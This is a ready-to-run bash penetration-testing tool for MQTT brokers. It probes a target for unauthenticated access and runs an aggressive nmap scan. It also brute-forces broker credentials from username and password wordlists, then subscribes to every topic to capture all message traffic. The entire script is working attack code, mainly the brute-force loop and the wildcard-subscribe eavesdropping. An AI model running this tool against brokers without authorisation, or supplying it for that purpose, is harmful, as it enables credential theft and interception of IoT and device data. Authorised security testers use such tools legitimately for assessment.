#!/bin/bash

# Color variables
green='\033[0;32m'
yellow='\033[1;33m'
blue='\033[0;34m'
bold='\033[1m'
red='\033[0;31m'
cyan='\033[0;36m'
magenta='\033[0;35m'
reset='\033[0m'

verbose=false

# Function to check if MQTT service is accessible
check_mqtt_service() {
    ip=$1
    port=$2
    
    echo -e "${blue}Checking MQTT service on ${cyan}${ip}:${port}${reset}${blue}...${reset}"
    
    # Try without authentication
    mosquitto_pub -h $ip -p $port -t "test" -m "Testing MQTT service" &> /dev/null
    if [ $? -eq 0 ]; then
        echo -e "${green}MQTT service is accessible on ${cyan}${ip}:${port}${reset}${green} without authentication${reset}"
        return 0
    fi

    # If failed, service might require authentication
    echo -e "${yellow}MQTT service on ${cyan}${ip}:${port}${reset}${yellow} requires authentication.${reset}"
    echo -e "${yellow}Try brute-forcing with the ${bold}-b${reset}${yellow} option.${reset}"
    return 1
}

# Function to perform advanced scan using nmap
advanced_scan() {
    ip=$1
    port=$2
    
    echo -e "${blue}Performing advanced scan using ${magenta}nmap${reset}${blue}...${reset}"
    sudo nmap -p $port -sS -sV -sC -A -Pn -vv --script mqtt-subscribe $ip
}

# Function to perform brute-force attack
brute_force_attack() {
    ip=$1
    port=$2

    # Read wordlist paths from user
    echo -e "${blue}Enter the path to the ${bold}username${reset}${blue} wordlist file: ${reset}"
    read -p "" username_wordlist
    echo -e "${blue}Enter the path to the ${bold}password${reset}${blue} wordlist file: ${reset}"
    read -p "" password_wordlist

    if [ ! -f "$username_wordlist" ] || [ ! -f "$password_wordlist" ]; then
        echo -e "${red}Error: Username or password wordlist file not found.${reset}"
        exit 1
    fi

    echo -e "${blue}Performing brute-force attack on MQTT service...${reset}"
    while IFS= read -r username; do
        while IFS= read -r password; do
            if $verbose; then
                echo -e "${cyan}Trying username: ${yellow}${username}${reset}${cyan} and password: ${yellow}${password}${reset}"
            fi
            mosquitto_pub -h $ip -p $port -t "test" -m "Testing MQTT service" -u "$username" -P "$password" &> /dev/null
            if [ $? -eq 0 ]; then
                echo -e "${green}Successfully accessed MQTT service on ${cyan}${ip}:${port}${reset}${green} with username: ${yellow}${username}${reset}${green} and password: ${yellow}${password}${reset}"
                return 0
            fi
        done < "$password_wordlist"
    done < "$username_wordlist"

    echo -e "${red}Failed to access MQTT service with the provided username and password wordlists.${reset}"
    return 1
}

# Function to check MQTT transactions
check_mqtt_transactions() {
    ip=$1
    port=$2

    echo -e "${blue}Enter the ${bold}username${reset}${blue} (leave blank if none): ${reset}"
    read -p "" username
    echo -e "${blue}Enter the ${bold}password${reset}${blue} (leave blank if none): ${reset}"
    read -s -p "" password
    echo

    if [ -z "$username" ] && [ -z "$password" ]; then
        echo -e "${cyan}Attempting to connect without authentication...${reset}"
        mosquitto_sub -h $ip -p $port -t "#" -v
    else
        echo -e "${cyan}Attempting to connect with provided credentials...${reset}"
        mosquitto_sub -h $ip -p $port -t "#" -u "$username" -P "$password" -v
    fi

    if [ $? -eq 0 ]; then
        echo -e "${green}Successfully listed transactions on ${cyan}${ip}:${port}${reset}"
    else
        echo -e "${yellow}Failed to list transactions. Please check your credentials or try brute-forcing with the ${bold}-b${reset}${yellow} option.${reset}"
    fi
}

# Function to display tool usage
display_usage() {
    echo -e "${bold}Usage:${reset}"
    echo -e "  ${bold}moxie.sh <option> [ip] [port]${reset}"
    echo
    echo -e "${bold}Options:${reset}"
    echo -e "  ${bold}-c, --check${reset}         Check MQTT service"
    echo -e "  ${bold}-s, --scan${reset}          Perform advanced scan"
    echo -e "  ${bold}-b, --bruteforce${reset}    Conduct brute-force attack"
    echo -e "  ${bold}-t, --transactions${reset}  Check MQTT transactions"
    echo -e "  ${bold}-h, --help${reset}          Display this help message"
}

# Main function
main() {
    echo -e "${cyan}"
    echo "  ___  __________   _______ _____  "
    echo "  |  \/  |  _  \ \ / /_   _|  ___|"
    echo "  | .  . | | | |\ V /  | | | |__   "
    echo "  | |\/| | | | |/   \  | | |  __|  "
    echo "  | |  | \ \_/ / /^\ \_| |_| |___  "
    echo "  \_|  |_/\___/\/   \/\___/\____/  "
    echo "         The MQTT Pentester    "
    echo "                               "
    echo "         Author: aravind0x7    "
    echo -e "${reset}"

    if [ $# -eq 0 ]; then
        display_usage
        exit 1
    fi

    while [[ $# -gt 0 ]]; do
        case $1 in
            -c|--check)
                if [ $# -ne 3 ]; then
                    echo -e "${red}Error: IP address and port number are required.${reset}"
                    display_usage
                    exit 1
                fi
                check_mqtt_service $2 $3
                exit $?
                ;;
            -s|--scan)
                if [ $# -ne 3 ]; then
                    echo -e "${red}Error: IP address and port number are required.${reset}"
                    display_usage
                    exit 1
                fi
                advanced_scan $2 $3
                exit $?
                ;;
            -b|--bruteforce)
                if [ $# -ne 3 ]; then
                    echo -e "${red}Error: IP address and port number are required.${reset}"
                    display_usage
                    exit 1
                fi
                brute_force_attack $2 $3
                exit $?
                ;;
            -t|--transactions)
                if [ $# -ne 3 ]; then
                    echo -e "${red}Error: IP address and port number are required.${reset}"
                    display_usage
                    exit 1
                fi
                check_mqtt_transactions $2 $3
                exit $?
                ;;
            -v|--verbose)
                verbose=true
                ;;
            -h|--help)
                display_usage
                exit 0
                ;;
            *)
                echo -e "${red}Error: Invalid option.${reset}"
                display_usage
                exit 1
                ;;
        esac
        shift
    done
}

# Execute main function with command-line arguments
main "$@"
